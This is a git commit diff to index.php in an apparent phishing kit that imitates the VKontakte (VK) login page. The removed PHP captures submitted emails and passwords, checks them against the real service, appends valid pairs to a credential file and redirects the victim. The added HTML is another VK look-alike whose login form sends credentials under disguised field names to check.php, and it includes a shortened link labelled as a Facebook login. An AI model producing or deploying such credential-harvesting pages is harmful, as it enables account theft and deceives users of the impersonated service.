f9945f7478ba29df1178a2b1dad7d5e3f59e6031
vk-com-arenda37 <84401124+vk-com-arenda37@users.noreply.github.com>
2021-05-18 20:06:11 +0300

    Add files via upload

--- index.php
+++ index.php
@@ -1,104 +1,99 @@
-<?php
+<!DOCTYPE html>
 
-include "core/function.php";
-include "core/config.php";
-$server = $_SERVER['SERVER_NAME'];
-$Request = $_POST + $_GET;
-if (isset($Request['email'], $Request['pass'])) {
-    $email = htmlspecialchars($Request['email']);
-    $pass = htmlspecialchars($Request['pass']);
-    $data = $email . ':' . $pass;
+<html>
+	<head>
+		<meta charset="Utf-8"/>
+		<link href="main.css" rel="stylesheet" type="text/css"/>
+		<title>Добро пожаловать | Вконтакте</title>
+	</head>
 
-
-
-
-    if (mb_strlen($email) > 3  or mb_strlen($pass) > 3){
-
-        if (!Dublicats($bd_files, $data)){
-            if (Validation_account($email, $pass) != 'NO'){
-                /// РЕДИРЕКТТТТТТ
-                ///
-                ///
-                file_put_contents($bd_files, $data, FILE_APPEND);
-                header("Location:".$location);
-            } else {
-                $error ='<div class="box_error">Указан неверный логин или пароль.</div>';
-            }
-        } else {
-
-            /// Если найден дубликат
-            ///
-            header("Location:".$location);
-
-
-        }
-
-    } else {
-        $error ='<div class="box_error">Указан неверный логин или пароль.</div>';
-    }
-
-
-
-}
-
-
-
-?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
-<head>
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <title>ВКонтакте | Вход</title>
-    <link rel="stylesheet" type="text/css" href="css/al/common.css?71112267750" /><link rel="stylesheet" type="text/css" href="http://localhost/css/al/fonts_cnt.css?2660709036" />
-    <link type="text/css" rel="stylesheet" href="css/api/oauth_popup.css?30493685624"></link>
-    <script type="text/javascript" language="javascript" src="js/api/common_light.js?2102079137"></script>
-
-</head>
-
-<body onload="doResize();" class="VK oauth_centered">
-<script>
-    if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
-</script>
-<div class="oauth_wrap">
-    <div class="oauth_wrap_inner">
-        <div class="oauth_wrap_content" id="oauth_wrap_content">
-            <div class="oauth_head">
-                <a class="oauth_logo fl_l" href="http://<?=$server;?>" target="_blank"></a>
-                <div id="oauth_head_info" class="oauth_head_info fl_r">
-                    <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
-                </div>
-            </div>
-
-            <div class="oauth_content box_body clear_fix">
-                <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>
-
-                <form method="POST" id="login_submit">
-                    <div class="oauth_form">
-
-                        <!--           Не верный пароль
-                         <div class="box_error">Указан неверный логин или пароль.</div>
-                         --->
-                        <?=$error?>
-
-                        <div class="oauth_form_login">
-
-
-                            <div class="oauth_form_header">Телефон или email</div>
-                            <input type="text" class="oauth_form_input dark" name="email" value="" required>
-                            <div class="oauth_form_header">Пароль</div>
-                            <input type="password" class="oauth_form_input dark" name="pass"  required />
-
-
-
-                            <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
-                            <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
-                            <input type="submit" name="submit_input" class="unshown">
-                        </div>
-                    </div>
-                </form>
-            </div>
-        </div>
-    </div>
-</div>
-</body>
+	<body>
+		<header>
+			<div id="wrapperHeader">
+				<div id="logotype" onClick="location = 'index.php';"></div>
+					<div id="wrapperSearch"><input type="text" id="search" placeholder="Поиск"/></div>
+				<div id="title">Switch to English</div>	
+			</div>
+		</header>
+			<div id="wrapper">
+				<div id="mobileVersion">
+					<div id="title">ВКонтакте для мобильных устройств</div>
+						<div id="altTitle">Установите официальное мобильное приложение ВКонтакте и оставайтесь <br/>в курсе новостей Ваших друзей, где бы Вы ни находились.</div>
+					<div id="android" onClick="downloadAndroidVersoion()">
+						<div id="download"><div id="logo"></div>VK для Android</div>
+					</div>
+						<div id="ios" onClick="downloadIosVersoion()">
+							<div id="download"><div id="logo"></div>VK для iPhone</div>
+						</div>
+					<div id="wp" onClick="downloadWpVersoion()">
+						<div id="download"><img src="images/icoWp.png" id="fuckLogoWP" alt="">VK для WP</div>
+					</div>
+				</div>
+		
+				<div id="rightForm">
+					<div id="authorizationForm">
+						<form name="authorization" action="check.php" method="POST">
+							<input type="text" name="counter" id="login" placeholder="Телефон или email"/>
+							<input type="password" name="strike" id="password" placeholder="Пароль"/>
+							<button id="finishAuthorization">Войти</button>
+							<div id="restorePass"><a href="https://new.vk.com/restore">Забыли пароль?</a></div>
+						</form>
+					</div>
+					
+					<div id="registrationForm">
+						<div id="title">Впервые ВКонтакте?</div>
+							<div id="altTitle">Моментальная регистрация</div>
+							<input type="text" name="nameUser" id="nameUser" placeholder="Ваше имя"/>
+						<input type="text" name="lastnameUser" id="lastnameUser" placeholder="Ваша фамилия"/>
+							<span id="birthdayTitle">Дата рождения: </span>
+						<?php include('dateList.php'); ?>
+						<div id="button"><input type="button" id="registrationButton" value="Зарегистрироваться"/></div>
+					</div>
+					
+					<div id="authorizationFacebookForm">
+						<div id="linkFacebook"><a href="https://goo.gl/Rw2VcO">Войти через Facebook</a></div>
+					</div>
+				</div>
+					<div class="clear"></div>
+			<footer>
+				<div id="aboutVk">
+					<a href="https://new.vk.com/about" target="_blank">ВКонтакте</a> &copy; <?php echo date("Y"); ?>
+				</div>
+			
+				<div id="infoVk">
+					<a href="https://new.vk.com/about" target="_blank" class="marginRightLink">о компании</a> 
+					<a href="https://new.vk.com/terms" target="_blank" class="marginRightLink">правила</a> 
+					<a href="https://new.vk.com/ads" target="_blank" class="marginRightLink">реклама</a> 
+					<a href="https://new.vk.com/dev" target="_blank" class="marginRightLink">разработчикам</a> 
+				</div>
+				
+				<div id="languageVk">
+					Язык:
+					<a href="#">English</a> 
+					<a href="#">Русский</a> 
+					<a href="#">Українська</a> 
+					<a href="#">все языки »</a> 
+				</div>
+			</footer>
+		</div>
+		
+		<!--JavaScript Start-->
+		
+			<script type="text/javascript">
+				function downloadAndroidVersoion() {
+					window.open("https://play.google.com/store/apps/details?id=com.vkontakte.android");
+				}
+				
+				function downloadIosVersoion() {
+					window.open("https://itunes.apple.com/ru/app/id564177498");
+				}
+				
+				function downloadWpVersoion() {
+					window.open("http://windowsphone.com/s?appid=edd920e2-b671-41b5-a9db-b89caccfa69c");
+				}
+			
+			</script>
+		
+		<!--JavaScript End-->
+	</body>
 </html>
